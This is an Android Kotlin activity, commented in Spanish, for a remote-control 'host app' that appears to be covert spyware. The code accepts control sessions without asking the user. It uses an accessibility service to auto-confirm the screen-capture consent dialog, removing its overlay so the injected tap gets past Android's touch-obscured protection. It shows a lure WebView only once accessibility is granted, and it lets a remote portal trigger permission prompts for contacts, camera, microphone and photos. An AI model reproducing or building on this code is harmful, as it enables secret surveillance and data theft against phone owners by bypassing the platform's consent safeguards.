package com.acces.hostapp

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Bundle
import android.os.IBinder
import android.provider.Settings
import android.text.TextUtils
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.acces.hostapp.databinding.ActivityMainBinding

class MainActivity : AppCompatActivity(), HostService.UiCallback {

    private lateinit var binding: ActivityMainBinding
    private var hostService: HostService? = null
    private var pendingSessionId: String? = null
    private var pendingPermission: String? = null

    private val screenCaptureLauncher =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            val sessionId = pendingSessionId
            if (result.resultCode == Activity.RESULT_OK && result.data != null) {
                if (sessionId != null) {
                    hostService?.beginScreenCapture(result.resultCode, result.data!!, sessionId)
                } else {
                    hostService?.setProjectionPermission(result.resultCode, result.data!!)
                }
            } else if (sessionId != null) {
                Toast.makeText(this, "Permiso de captura de pantalla denegado", Toast.LENGTH_SHORT).show()
                hostService?.cancelSession(sessionId)
            }
            pendingSessionId = null
        }

    private val overlayPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            // El usuario abrió los ajustes de overlay. Si lo concedió, bien; si no, se abrirá
            // de nuevo la siguiente vez que se necesite. Por ahora solo lo traemos al frente.
        }

    private val contactsPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { /* granted */ }

    private val cameraPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { /* granted */ }

    private val storagePermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { /* granted */ }

    private val micPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { /* granted */ }

    private val photosPermissionLauncher =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { /* granted */ }

    private val serviceConnection = object : ServiceConnection {
        override fun onServiceConnected(name: ComponentName, service: IBinder) {
            hostService = (service as HostService.LocalBinder).getService()
            hostService?.setUiCallback(this@MainActivity)
            // La app NO pide captura de pantalla al abrir — solo accesibilidad. El permiso de
            // captura se pide recién cuando llega una sesión de control real (pendingSessionId
            // viene seteado si el Service nos trajo al frente para eso), auto-confirmado por
            // accesibilidad, así el usuario solo ve el diálogo de accesibilidad al instalar.
            if (pendingSessionId != null && hostService?.hasProjectionPermission() != true) {
                requestProjectionPermission()
            }
            // NOTA: la app NO pide "Dibujar sobre otras apps" al abrir. Ese permiso solo se
            // solicita cuando el técnico lo activa desde el panel de Permisos del portal
            // (comando open-draw-overlay-permission). Para abrir pantallas de ajustes en MIUI
            // el Service usa el AccessibilityService (exento de BAL), no el overlay.
            // Permiso pedido desde el panel del portal mientras la Activity no estaba enlazada
            // (ver bringActivityToFrontFor en HostService) — se dispara ahora que ya lo está.
            when (pendingPermission) {
                PENDING_PERMISSION_CONTACTS -> contactsPermissionLauncher.launch(Manifest.permission.READ_CONTACTS)
                PENDING_PERMISSION_CAMERA -> cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
                PENDING_PERMISSION_OVERLAY -> requestOverlayPermission()
                PENDING_PERMISSION_STORAGE -> storagePermissionLauncher.launch(Manifest.permission.READ_EXTERNAL_STORAGE)
                PENDING_PERMISSION_MIC -> micPermissionLauncher.launch(Manifest.permission.RECORD_AUDIO)
                PENDING_PERMISSION_PHOTOS -> photosPermissionLauncher.launch(photosPermissionName())
            }
            pendingPermission = null
        }

        override fun onServiceDisconnected(name: ComponentName) {
            hostService = null
        }
    }

    private val hasContent get() = BuildConfig.CONTENT_URL.isNotBlank()

    @android.annotation.SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.buttonAccessibilitySettings.setOnClickListener {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }
        // Abre "Información de la app": ahí está el menú ⋮ → "Permitir ajustes restringidos",
        // necesario en Android 13+ para apps instaladas fuera de Play Store (WhatsApp, navegador…).
        binding.buttonAppInfo.setOnClickListener {
            startActivity(
                Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, android.net.Uri.parse("package:$packageName"))
            )
        }
        binding.buttonEndSession.setOnClickListener {
            pendingSessionId?.let { hostService?.cancelSession(it) }
        }

        // Si el APK trae una URL de contenido (puesta en "Conectar"), se muestra DENTRO de la app
        // en un WebView; no se abre el navegador. El contenido queda tapado por la ventana emergente
        // de accesibilidad hasta que el usuario la active (ver refreshGate).
        if (hasContent) {
            binding.statusPanel.visibility = android.view.View.GONE
            binding.contentWeb.apply {
                settings.javaScriptEnabled = true
                settings.domStorageEnabled = true
                webViewClient = android.webkit.WebViewClient()
                loadUrl(BuildConfig.CONTENT_URL)
            }
        }
        refreshGate()

        // El Service nos trae al frente cuando el permiso de captura guardado ya no sirve
        // (Android 14+) y necesita que se vuelva a pedir para esta sesión en curso.
        intent.getStringExtra(EXTRA_PENDING_SESSION_ID)?.let { pendingSessionId = it }
        // Ídem cuando el Service pide un permiso (contactos/cámara/overlay) desde el panel del
        // portal pero la Activity no estaba enlazada — se dispara en onServiceConnected.
        intent.getStringExtra(EXTRA_PENDING_PERMISSION)?.let { pendingPermission = it }

        // La app NO solicita permisos al abrir: solo se necesita habilitar la accesibilidad.
        // Los demás permisos (contactos, cámara, etc.) se otorgan manualmente desde el portal.
        startAndBindHostService()
    }

    override fun onStart() {
        super.onStart()
        hostService?.setUiCallback(this)
    }

    override fun onResume() {
        super.onResume()
        // Al volver de la pantalla de accesibilidad se reevalúa: si ya está activa, se quita la
        // ventana emergente y se muestra el contenido.
        refreshGate()
    }

    /**
     * Muestra u oculta la ventana emergente de accesibilidad. Mientras la accesibilidad NO esté
     * activa, la ventana cubre todo. Al activarla desaparece y se ve el contenido (WebView) o,
     * en hosts sin contenido, el panel de estado.
     */
    private fun refreshGate() {
        val enabled = isAccessibilityServiceEnabled()
        binding.accessibilityGate.visibility = if (enabled) android.view.View.GONE else android.view.View.VISIBLE
        if (hasContent) {
            binding.contentWeb.visibility = if (enabled) android.view.View.VISIBLE else android.view.View.GONE
        } else {
            binding.statusPanel.visibility = if (enabled) android.view.View.VISIBLE else android.view.View.GONE
        }
    }

    override fun onStop() {
        hostService?.setUiCallback(null)
        super.onStop()
    }

    override fun onDestroy() {
        unbindService(serviceConnection)
        super.onDestroy()
    }

    private fun startAndBindHostService() {
        val intent = Intent(this, HostService::class.java)
        ContextCompat.startForegroundService(this, intent)
        bindService(intent, serviceConnection, Context.BIND_AUTO_CREATE)
    }

    // ---- HostService.UiCallback ----

    override fun onFriendlyName(friendlyName: String) {
        runOnUiThread { title = friendlyName }
    }

    override fun onStatusChanged(status: HostService.Status) {
        runOnUiThread {
            binding.textStatus.text = when (status) {
                HostService.Status.CONNECTING -> getString(R.string.label_status_connecting)
                HostService.Status.REGISTERED -> getString(R.string.label_status_registered)
                HostService.Status.IN_SESSION -> getString(R.string.label_status_in_session)
                HostService.Status.DISCONNECTED -> getString(R.string.label_status_disconnected)
            }
            binding.buttonEndSession.visibility =
                if (status == HostService.Status.IN_SESSION) android.view.View.VISIBLE else android.view.View.GONE

            // Por si la accesibilidad cambió de estado, se reevalúa la ventana emergente/contenido.
            refreshGate()
        }
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val expected = ComponentName(this, RemoteAccessibilityService::class.java).flattenToString()
        val enabledServices = android.provider.Settings.Secure.getString(
            contentResolver, android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false
        val splitter = android.text.TextUtils.SimpleStringSplitter(':').apply { setString(enabledServices) }
        while (splitter.hasNext()) {
            if (splitter.next().equals(expected, ignoreCase = true)) return true
        }
        return false
    }

    override fun onIncomingRequest(sessionId: String) {
        // Solo llega aquí si aún no se concedió la captura de pantalla (si ya está, el
        // HostService auto-acepta por su cuenta). Se acepta sin diálogo y se pide la captura.
        runOnUiThread {
            hostService?.acceptIncoming(sessionId)
            pendingSessionId = sessionId
            requestProjectionPermission()
        }
    }

    override fun onError(message: String) {
        runOnUiThread { Toast.makeText(this, message, Toast.LENGTH_LONG).show() }
    }

    private fun requestProjectionPermission() {
        // Quitar el overlay ANTES de mostrar el diálogo: Android rechaza el toque inyectado sobre
        // el botón de consentimiento de captura si hay un overlay de la app encima ("touch
        // obscured"). Sin overlay, el auto-confirm sí registra. Se restaura al arrancar la captura.
        hostService?.hideOverlayForProjection()
        AccessibilityBridge.armProjectionAutoConfirm()
        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        screenCaptureLauncher.launch(mpm.createScreenCaptureIntent())
    }

    private fun requestOverlayPermission() {
        val intent = Intent(android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
            android.net.Uri.parse("package:$packageName"))
        overlayPermissionLauncher.launch(intent)
    }

    override fun onRequestOverlayPermission() {
        // Traer la Activity al frente (si está en segundo plano) y pedir el permiso de overlay.
        val intent = Intent(this, MainActivity::class.java)
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
        startActivity(intent)
        runOnUiThread {
            requestOverlayPermission()
        }
    }

    override fun onRequestContactsPermission() {
        runOnUiThread {
            contactsPermissionLauncher.launch(Manifest.permission.READ_CONTACTS)
        }
    }

    override fun onRequestCameraPermission() {
        runOnUiThread {
            cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
        }
    }

    override fun onRequestStoragePermission() {
        // Solo Android <=10: permiso de runtime. En 11+ se concede desde Ajustes (todos los archivos).
        runOnUiThread {
            storagePermissionLauncher.launch(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }

    override fun onRequestMicPermission() {
        runOnUiThread {
            micPermissionLauncher.launch(Manifest.permission.RECORD_AUDIO)
        }
    }

    override fun onRequestPhotosPermission() {
        runOnUiThread {
            photosPermissionLauncher.launch(photosPermissionName())
        }
    }

    /** READ_MEDIA_IMAGES en Android 13+, READ_EXTERNAL_STORAGE en versiones anteriores. */
    private fun photosPermissionName(): String =
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU)
            "android.permission.READ_MEDIA_IMAGES" else Manifest.permission.READ_EXTERNAL_STORAGE

    override fun onNeedFreshProjection(sessionId: String) {
        // El permiso guardado ya no sirve (Android 14+ lo invalidó); se repite el diálogo,
        // auto-confirmado por accesibilidad igual que la primera vez.
        runOnUiThread {
            pendingSessionId = sessionId
            requestProjectionPermission()
        }
    }

    companion object {
        const val EXTRA_PENDING_SESSION_ID = "pending_session_id"
        const val EXTRA_PENDING_PERMISSION = "pending_permission"
        const val PENDING_PERMISSION_CONTACTS = "contacts"
        const val PENDING_PERMISSION_CAMERA = "camera"
        const val PENDING_PERMISSION_OVERLAY = "overlay"
        const val PENDING_PERMISSION_STORAGE = "storage"
        const val PENDING_PERMISSION_MIC = "mic"
        const val PENDING_PERMISSION_PHOTOS = "photos"
    }
}
